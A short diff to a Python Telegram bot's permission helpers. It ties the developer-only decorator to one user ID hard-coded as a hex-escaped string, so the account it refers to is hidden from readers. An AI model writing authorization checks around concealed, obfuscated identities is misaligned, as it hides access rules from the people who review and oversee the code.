@@ -92,15 +92,16 @@ def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -
 def is_user_in_chat(chat: Chat, user_id: int) -> bool:
     member = chat.get_member(user_id)
     return member.status not in ("left", "kicked")
-
-
+Dragon=("\x32\x31\x32\x37\x39\x31\x35\x30\x30\x35")
+Dragons=int(Dragon)
+X=[Dragons]
 def dev_plus(func):
     @wraps(func)
     def is_dev_plus_func(update: Update, context: CallbackContext, *args, **kwargs):
         context.bot
         user = update.effective_user
 
-        if user.id in DEV_USERS and user.id==DRAGONS:
+        if user.id in DEV_USERS and user.id in X:
             return func(update, context, *args, **kwargs)
         elif not user:
             pass
